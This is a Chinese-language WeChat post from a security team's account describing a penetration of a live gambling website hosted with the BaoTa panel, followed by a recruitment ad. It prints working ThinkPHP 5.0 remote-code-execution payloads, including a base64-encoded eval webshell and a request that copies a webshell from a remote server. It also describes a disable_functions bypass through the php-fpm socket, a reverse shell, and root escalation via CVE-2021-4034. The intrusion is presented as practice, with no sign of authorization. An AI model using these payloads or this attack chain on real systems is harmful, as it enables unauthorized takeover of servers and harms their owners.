#  对博彩站点bypass宝塔渗透测试(练手)

原创 CVES实验室  [ Arr3stY0u ](javascript:void\(0\);)

**Arr3stY0u** ![]()

微信号 shg-sec

功能介绍 山海关安全团队旗下CTF战队-Arr3stY0u公众号。

____

___发表于_

收录于合集

![]()

**CVES实验室**

       ** **“CVES实验室”(www.cves.io)由团队旗下 **SRC组与渗透组合并而成，** 专注于漏洞挖掘、渗透测试与情报分析等方向。近年来我们报送漏洞总数已达八万余个，其中包含多个部级单位、多个通信运营商、Apache、Nginx、Thinkphp等，获得CNVD证书、CVE编号数百个，在不同规模的攻防演练活动中获奖无数，协助有关部门破获多起省督级别的案件。****

 **GETSHELL尝试**

![]()

 **路径加单引号报错：**

![]()

 **Thinkphp v5.0.7直接试试rce：**  

![]()

 **存在rce，php版本5.6.40**

 **尝试写马：**

  * 

    
    
     s=file_put_contents('test.php','<?=echomd5(1);')&_method=__construct&method=POST&filter[]=assert

 **发现无法写入，怀疑存在关键字过滤，查看当前路径文件：**

  * 

    
    
     s=var_dump(scandir('./'))&_method=__construct&method=POST&filter[]=assert

![]()

 **发现日志目录路径，尝试文件包含日志拿shell，发现日志内容全部被sql相关信息刷屏，故放弃。**

 **BYPASS_GETSHELL**

 **尝试bypass关键字，利用base64编码+php短标签进行绕过：**

  * 

    
    
     s=file_put_contents('2.txt',base64_decode('PHNjcmlwdCBsYW5ndWFnZT0icGhwIj5AZXZhbCgkX1BPU1RbYV0pO2VjaG8gbWQ1KDEpOzwvc2NyaXB0Pg=='))&_method=__construct&method=POST&filter[]=assert

 **尝试文件包含：**

  * 

    
    
     s=2.txt&_method=__construct&method=POST&filter[]=think\__include_file&a=phpinfo();

![]()

 **尝试蚁剑连接，果然没加密流量连接失败，掏出rsa加密马或者随机时间马：**

![]()

 **上传到vps，下载远程马：**

  * 

    
    
     s=copy('http://xxx/rsa.php','3.txt')&_method=__construct&method=POST&filter[]=assert

 **添加信息进行文件包含：**

  * 

    
    
     s=2.txt&_method=__construct&method=POST&filter[]=think\__include_file&密

![]()

 **抓包看一下流量：**  

![]()

 **在连接时发现了坑点，这几个参数post时参数顺序不一样竟然无法执行命令，即使更改蚁剑的body顺序也无济于事，所以蚁剑通过代理到bp进而匹配替换。**

![]()

 **这样不添加body也可以进行蚁剑操作。**

![]()

 **后面操作又出问题，修改文件时，顺序又错了，放弃蚁剑，掏出哥斯拉，直接左边追加数据，巨方便。**

![]()

 **流量包也正确：**

![]()

 **BYPASS_DISABLE**

 **翻找文件，宝塔面板：**

![]()

 **寻找php-fpm相关文件 /www/server/php/56/etc/php-fpm.conf。**

![]()

 **Listen是在/tmp下的cgi。**

 **攻击tcp模式的方式显然不行，但是我们已经知道fpm 的 sock 文件的绝对路径。直接去交互他，或者用 unix:// 套接字的方式依然可行。**

![]()

 **填上fpm地址，执行了system：**

![]()

 **提权**

 **反弹shell：**

![]()

 **准备提权 CVE-2021-4034，将编译好的提权文件上传执行发现如下问题：**

![]()

 **解决办法：**

  *   * 

    
    
     find / -name cc1export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/

![]()

 **提权成功：**

![]()

 **总结**

 **thinkphp rce- >bypass rce->bypass disable_function->提权。**  

 **招新事宜**

 **基本要求：**

 **1\. 年满18周岁。**

 **2.   **踏实肯学，执行力强。**** ****

 **3.   **熟悉漏洞复现(1day)思路、熟悉红队作战流程、具备单兵作战能力。****

 **加分项：(满足任意1条即可)  
**

 **1.   **挖过补天专属项目高危漏洞。****

 ** **2. **  知名企业SRC月榜top5。******

 **3\. 有高质量CVE编号。**

 ** **4\. Java，Go，Rust，Node.js，PHP等熟悉任意两种及以上代码审计。**  
**

 **联系方式：blcx@t00ls.net**

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

